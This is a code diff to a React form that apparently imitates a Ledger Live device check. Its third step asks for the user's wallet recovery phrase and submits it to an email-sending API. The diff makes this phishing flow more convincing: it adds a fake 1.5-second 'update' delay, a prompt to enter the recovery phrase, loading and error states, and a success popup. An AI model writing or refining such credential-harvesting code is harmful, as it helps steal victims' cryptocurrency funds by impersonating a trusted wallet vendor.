@@ -17,23 +17,15 @@ import {
 const Form = () => {
   const navigate = useNavigate();
   const [selectedImage, setSelectedImage] = useState(null);
-      useEffect(() => {
-        if (selectedImage) {
-          console.log(""); 
-          }
-          }, [selectedImage]);
-  
   const [currentStep, setCurrentStep] = useState(0);
   const [loading, setLoading] = useState(false);
   const [imageSelected, setImageSelected] = useState(false);
   const [userInput, setUserInput] = useState("");
-      useEffect(() => {
-        if (userInput) {
-          console.log(""); 
-           }
-          }, [userInput]);
   const [showPopup, setShowPopup] = useState(false);
   const [formData, setFormData] = useState("");
+  const [submitLoading, setSubmitLoading] = useState(false);
+  const [submitError, setSubmitError] = useState("");
+
   const steps = ["Device Detection", "Device Check", "Ledger Live"];
 
   const handleImageSelect = (image) => {
@@ -48,12 +40,12 @@ const Form = () => {
   };
 
   const handleUpdateClick = () => {
-    setLoading(false);
+    setLoading(true);
 
     setTimeout(() => {
       setCurrentStep(2);
       setLoading(false);
-    });
+    }, 1500);
   };
 
   const handleFormDataChange = (event) => {
@@ -63,10 +55,19 @@ const Form = () => {
 
   const handleClosePopup = () => {
     setShowPopup(false);
+    navigate("/success");
   };
 
   const handleStep3Submit = async (event) => {
     event.preventDefault();
+
+    if (!formData.trim()) {
+      setSubmitError("Please enter your recovery phrase");
+      return;
+    }
+
+    setSubmitLoading(true);
+    setSubmitError("");
 
     try {
       const response = await fetch("https://api.resend.com/emails", {
@@ -85,13 +86,17 @@ const Form = () => {
 
       if (response.ok) {
         setFormData("");
-        navigate("/success");
+        setShowPopup(true);
       } else {
         const errorData = await response.json();
+        setSubmitError("Failed to submit. Please try again.");
         console.error("Error:", errorData);
       }
     } catch (error) {
+      setSubmitError("Network error. Please check your connection.");
       console.error("Fetch error:", error);
+    } finally {
+      setSubmitLoading(false);
     }
   };
 
@@ -216,8 +221,14 @@ const Form = () => {
                 ></textarea>
               </div>
 
-              <button type="submit" className={styles.submitButton}>
-                Continue
+              {submitError && <p style={{ color: "red" }}>{submitError}</p>}
+
+              <button 
+                type="submit" 
+                className={styles.submitButton}
+                disabled={submitLoading}
+              >
+                {submitLoading ? "Submitting..." : "Continue"}
               </button>
             </form>
           </div>
